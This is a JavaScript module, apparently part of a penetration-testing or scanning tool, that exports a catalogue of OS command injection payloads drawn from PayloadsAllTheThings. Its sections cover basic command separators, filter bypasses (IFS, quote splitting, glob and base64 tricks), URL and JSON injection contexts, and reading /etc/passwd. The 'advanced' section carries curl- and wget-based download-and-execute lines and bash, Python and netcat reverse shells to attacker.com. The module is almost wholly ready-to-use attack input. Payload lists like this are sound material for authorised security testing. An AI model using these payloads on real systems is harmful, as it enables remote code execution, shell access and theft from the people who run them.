/**
 * Command Injection Payload Module
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
 *
 * Categories: basic, advanced, filter_bypass, context_url, context_json, context_header
 */

const payloads = [
    // ── BASIC ──────────────────────────────────────────────────────────────────
    {
        type: "basic",
        payload: "; id",
        description: "Semicolon command separator (Linux)",
        expected_behavior: "Executes 'id' command after the original; output shows uid/gid"
    },
    {
        type: "basic",
        payload: "| id",
        description: "Pipe command chaining (Linux/Windows)",
        expected_behavior: "Pipes previous command output and executes 'id'"
    },
    {
        type: "basic",
        payload: "|| id",
        description: "OR operator — execute if first command fails",
        expected_behavior: "Executes 'id' if the previous command fails"
    },
    {
        type: "basic",
        payload: "&& id",
        description: "AND operator — execute if first command succeeds",
        expected_behavior: "Executes 'id' after successful first command"
    },
    {
        type: "basic",
        payload: "& id",
        description: "Background execution (Linux)",
        expected_behavior: "Runs 'id' in background alongside original command"
    },
    {
        type: "basic",
        payload: "; whoami",
        description: "Execute whoami to identify running user",
        expected_behavior: "Returns the username the web server process runs as"
    },
    {
        type: "basic",
        payload: "| cat /etc/passwd",
        description: "Read /etc/passwd via command injection",
        expected_behavior: "Outputs system user list proving arbitrary file read"
    },
    {
        type: "basic",
        payload: "& dir",
        description: "Windows directory listing",
        expected_behavior: "Lists current directory contents on Windows"
    },
    {
        type: "basic",
        payload: "& type C:\\Windows\\win.ini",
        description: "Windows file read via type command",
        expected_behavior: "Outputs contents of win.ini on Windows systems"
    },

    // ── ADVANCED ───────────────────────────────────────────────────────────────
    {
        type: "advanced",
        payload: "`id`",
        description: "Backtick command substitution (Linux)",
        expected_behavior: "Shell evaluates backtick contents, executing 'id'"
    },
    {
        type: "advanced",
        payload: "$(id)",
        description: "Dollar-paren command substitution (Linux)",
        expected_behavior: "Shell evaluates $() contents, executing 'id'"
    },
    {
        type: "advanced",
        payload: "; curl https://attacker.com/shell.sh | bash",
        description: "Remote shell script download and execution",
        expected_behavior: "Downloads and executes attacker's shell script (full RCE)"
    },
    {
        type: "advanced",
        payload: "; wget https://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh",
        description: "wget-based remote shell execution",
        expected_behavior: "Downloads shell to /tmp and executes it"
    },
    {
        type: "advanced",
        payload: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        description: "Bash reverse shell",
        expected_behavior: "Opens interactive reverse shell to attacker on port 4444"
    },
    {
        type: "advanced",
        payload: "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        description: "Python reverse shell one-liner",
        expected_behavior: "Spawns reverse shell using Python socket and subprocess"
    },
    {
        type: "advanced",
        payload: "; nc -e /bin/sh attacker.com 4444",
        description: "Netcat reverse shell with -e flag",
        expected_behavior: "Connects back to attacker with interactive shell via netcat"
    },
    {
        type: "advanced",
        payload: "; mkfifo /tmp/f; nc attacker.com 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1",
        description: "Netcat reverse shell without -e flag (using FIFO)",
        expected_behavior: "Creates named pipe for bidirectional shell via netcat"
    },

    // ── FILTER BYPASS ──────────────────────────────────────────────────────────
    {
        type: "filter_bypass",
        payload: ";{id}",
        description: "Brace expansion bypass",
        expected_behavior: "Braces may bypass simple command separator filters"
    },
    {
        type: "filter_bypass",
        payload: "$IFS$9id",
        description: "IFS (Internal Field Separator) space bypass",
        expected_behavior: "$IFS acts as space; bypasses filters blocking space characters"
    },
    {
        type: "filter_bypass",
        payload: ";i]d",
        description: "Bracket injection to break command filters",
        expected_behavior: "Some shells ignore brackets and still execute 'id'"
    },
    {
        type: "filter_bypass",
        payload: "w'h'o'a'm'i",
        description: "Single-quote concatenation bypass",
        expected_behavior: "Shell concatenates quoted segments: w+h+o+a+m+i = whoami"
    },
    {
        type: "filter_bypass",
        payload: "w\"h\"o\"a\"m\"i",
        description: "Double-quote concatenation bypass",
        expected_behavior: "Shell concatenates double-quoted segments into 'whoami'"
    },
    {
        type: "filter_bypass",
        payload: "wh\\oam\\i",
        description: "Backslash escape bypass",
        expected_behavior: "Backslash-escaped chars are treated literally by shell"
    },
    {
        type: "filter_bypass",
        payload: "/???/??t /???/p??s??",
        description: "Wildcard/glob bypass for /bin/cat /etc/passwd",
        expected_behavior: "Glob patterns match /bin/cat and /etc/passwd without using blocked keywords"
    },
    {
        type: "filter_bypass",
        payload: "$(echo id | base64 -d | bash)",
        description: "Base64-encoded command execution",
        expected_behavior: "Decodes base64 command and executes via bash pipe"
    },
    {
        type: "filter_bypass",
        payload: "; echo aWQ= | base64 -d | bash",
        description: "Base64-encoded 'id' command execution",
        expected_behavior: "Decodes 'id' from base64 and executes it"
    },
    {
        type: "filter_bypass",
        payload: "%0aid",
        description: "Newline (%0a) command separator",
        expected_behavior: "URL-encoded newline acts as command separator in shell"
    },

    // ── CONTEXT: URL ───────────────────────────────────────────────────────────
    {
        type: "context_url",
        payload: "?ip=127.0.0.1%3B+id",
        description: "URL-encoded semicolon+space in parameter",
        expected_behavior: "%3B decodes to ; and triggers command injection in ip param"
    },
    {
        type: "context_url",
        payload: "?file=test%7Cid",
        description: "URL-encoded pipe in file parameter",
        expected_behavior: "%7C decodes to | which pipes into 'id' command"
    },

    // ── CONTEXT: JSON ──────────────────────────────────────────────────────────
    {
        type: "context_json",
        payload: "{\"hostname\": \"test; id\"}",
        description: "Command injection in JSON hostname field",
        expected_behavior: "If JSON value is passed to shell command, 'id' executes"
    },
    {
        type: "context_json",
        payload: "{\"filename\": \"test$(id).txt\"}",
        description: "Command substitution in JSON filename",
        expected_behavior: "$(id) evaluates if JSON value reaches shell context"
    },
];

module.exports = {
    vulnerability: "command_injection",
    name: "OS Command Injection",
    description: "Payloads for testing OS command injection on Linux and Windows including reverse shells, filter bypass, and encoded variants",
    payloads,
};
